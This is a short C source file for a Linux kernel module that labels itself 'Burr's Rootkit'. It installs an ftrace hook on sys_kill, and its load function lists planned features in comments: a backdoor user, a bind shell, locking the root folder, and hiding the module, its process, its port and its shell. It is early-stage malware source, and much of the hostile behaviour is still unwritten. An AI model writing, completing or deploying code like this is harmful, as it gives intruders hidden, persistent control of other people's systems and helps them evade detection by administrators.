#include "includes.h"
#include "ftrace_helper.h"
#include "csysFn/functions.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Burr");
MODULE_DESCRIPTION("Burr's Rootkit");
MODULE_VERSION("1.00");

struct ftrace_hook hooks[] = {
    HOOK("sys_kill", hookKill, &ogKill)
};

static int __init load(void) {
    //Create backdoor user
    //Create backdoor bind shell
    //Chmod, Chattr, NoClobber and Mount Bind root folder
    //Hide rootkit
    //Hide process
    //Hide listening port
    //Hide bind shell
    //Hook sys_write
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err)
        return err;
    printk(KERN_INFO "Hello world!\n");
    return 0;
}

static void __exit unload(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "Goodbye world!\n");
    return;
}

module_init(load);
module_exit(unload);
